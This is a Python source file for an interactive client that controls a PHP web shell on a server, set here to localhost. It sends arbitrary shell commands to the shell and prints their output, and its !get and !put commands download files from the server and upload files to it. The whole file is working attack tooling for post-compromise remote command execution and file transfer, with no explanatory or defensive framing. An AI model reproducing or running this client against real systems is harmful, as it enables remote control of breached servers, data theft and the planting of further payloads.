import os
import shutil
import requests

SERVER_ADDR = ("127.0.0.1", 80)
SERVER_URL = "http://{}/webshells/webshell1.php".format(':'.join(str(p) for p in SERVER_ADDR))

GET_FILE = "!get"
PUT_FILE = "!put"

CMD_TYPE = "cmd"
GET_TYPE = "getfile"
PUT_TYPE = "putfile"

CTRL_KEYWORD = "id"
EXIT_SHELL = "exit"

def run_cmd(cmd):
	return requests.post(SERVER_URL, data={"type": CMD_TYPE, CTRL_KEYWORD: cmd}).json()


def get_file(cmd):
	"""
	Downloads file from remote path on server to local
	Handles large file downloads
	!get <remote_path> <local_path>

	@return string describing status
	"""
	remote_path, local_path = cmd.strip().split(' ')[1:3]
	data = {"type": GET_TYPE, CTRL_KEYWORD: remote_path}

	# getting the file as a stream from the server
	with requests.post(SERVER_URL, stream=True, data=data) as r:
		if r.status_code == 404:
			return "File not found"

		# saving using the file object, data is read in chunks when writing
		with open(local_path, 'wb') as f:
			shutil.copyfileobj(r.raw, f)
	
	return "Done"


def put_file(cmd):
	"""
	Uploads file from local path to remote path on server
	!put <local_path> <remote_path>

	@return json describing status from server
	"""
	local_path, remote_path = cmd.strip().split(' ')[1:3]
	
	headers = {
	    "Content-Type":"application/binary",
	}

	# Sending the file as binary data inside a put body request,
	# passing the path on the Request URI 
	with open(local_path, 'rb') as f:
		params = {"type": PUT_TYPE, CTRL_KEYWORD: remote_path}
		res = requests.put(SERVER_URL, params=params, headers=headers, data=f.read())
	return res.json()


def display_result(result):
	""" 
	Handles printing of json and normal results
	"""
	# getfile does not return a json response
	if type(result) == str:
		print(result)
	elif "stderr" in result:
		print("Got Error:\n{}".format(result["stderr"]))
	elif "stdout" in result:
		print(result["stdout"])


def main():
	print("Special methods:")
	print("!get <remote_path> <local_path>")
	print("!put <local_path> <remote_path>")
	
	while True:
		cmd = input("$ ")
		if not cmd:
			continue
		elif cmd == EXIT_SHELL:
			break

		try:
			if GET_FILE in cmd:
				result = get_file(cmd)
			elif PUT_FILE in cmd:
				result = put_file(cmd)
			else:
				result = run_cmd(cmd)

			display_result(result)	

		except Exception as x:
			print("Home error: {}".format(x))

if __name__ == '__main__':
	main()
